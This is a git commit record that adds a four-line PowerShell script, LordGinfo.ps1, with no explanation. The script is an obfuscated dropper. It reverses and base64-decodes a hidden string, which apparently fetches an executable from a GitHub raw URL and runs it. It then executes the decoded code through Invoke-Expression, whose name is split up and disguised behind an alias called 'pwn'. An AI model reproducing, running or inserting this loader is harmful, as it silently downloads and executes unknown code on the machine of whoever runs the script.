e61efa40adb1b53304a79b6665dd9a6b508dd0c5
RAB301000001C3 <85085158+RAB301000001C3@users.noreply.github.com>
2023-11-13 09:18:52 +0800

    Add files via upload

---
+++ LordGinfo.ps1
@@ -0,0 +1,4 @@
+$best64code = "K0AduVGdu92YkACd1BHd19ULlRXaydlCNwmc1RCIpJXVtACZvhGdl1EdzVmUtU2avZnbJBSPgQnblRnbvNGJK0gI0hHduIXZpNWYsd0XkJ3bM9ibpFWbvIXZpNWYsdEZy9GTvMzQxADMwADMxAzMCFkUv02bj5CduVGdu92YyV2c1JWdoRXan5ydhJ3LvozcwRHdoJCI9ACbyVHJ" ;
+$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
+$LoadcODE = [sYSTEM.teXT.EncodiNG]::UTf8.gETsTRinG([sYSTEM.CoNVErt]::FrOmbASe64sTrIng("$basE64")) ;
+$pwN = "INV"+"okE"+"-EX"+"pRE"+"SsI"+"oN" ; nEW-AliAS -naME PWN -VAluE $pwN -FoRCe ; pwn $LoadCoDE ;
